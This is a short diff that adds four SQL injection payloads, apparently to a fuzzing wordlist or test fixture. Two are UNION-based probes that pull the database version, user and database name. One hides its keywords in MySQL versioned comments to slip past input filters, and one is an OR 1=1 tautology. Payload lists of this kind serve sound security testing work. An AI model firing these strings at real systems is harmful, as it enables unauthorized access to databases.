@@ -1,0 +1,4 @@
+' UNION SELECT null,version() -- 
+' UNION SELECT user(),database() -- 
+1'/*!50000UNION*//*!50000SELECT*/ 1,2,3-- -
+' OR 1=1 /*!0aNd*/ '1'='1
